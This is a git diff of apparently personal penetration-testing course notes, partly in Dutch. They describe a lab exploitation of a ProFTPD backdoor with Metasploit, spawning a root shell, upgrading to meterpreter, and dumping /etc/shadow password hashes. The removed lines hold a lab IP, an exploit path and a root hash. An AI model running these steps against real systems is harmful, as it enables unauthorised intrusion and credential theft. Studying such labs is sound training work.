@@ -361,41 +361,24 @@ Linux Password Hashes:
 5 and 6 are harder to crack 
 
 -- demo -- 
--  searchsploit for ftp version 
+-  `searchsploit` for ftp version 
 - start msfconsole and search exploit module (search proftpd)
 	- use backdoor module 
-	- /bin/bash -i  (to obtain bash session)
+	- `/bin/bash -i`  (to obtain bash session)
 	- id 
-	- cnt + Z to put this session in the background 
+	- cntrl + Z to put this session in the background 
 		- sessions 
 		**- sessions -u 1 (upgrade session 1 to meterpreter session)**
 		- sessions 
 		- session 2 
-		- sysinfo 
-		- getuid  (uid=0 -> root user )
-		- cat /etc/shadow (dump hashes)
+		- `sysinfo` 
+		- `getuid`  (uid=0 -> root user )
+		- `cat /etc/shadow` (dump hashes)
 			- put this in the background
 			  
 Andere manier is met hashdump module 
-- post/linux.gather/hashdump module 
+- `post/linux.gather/hashdump` module 
 - set session 2 (meterpreter session) 
 - give you hashed passwords and save them in a txt for you 
-  
-
---- --- ---- ---- ------- Lab ----- --- ---- ---- ---- --- ---- ---- 
-
-- auxiliary/analyze/crack_linux
-- Use /**usr/share/metasploit-framework/data/wordlists/unix_users.txt** for username dictionary
-
-
-192.69.237.2/24
-
-
-exploits/linux/remote/16921.rb 
-ProFTPd-1.3.3c 
-
-root:$6sgewtGbwihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:18348:0:99999:7::: 
-
-\$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb 
 
 
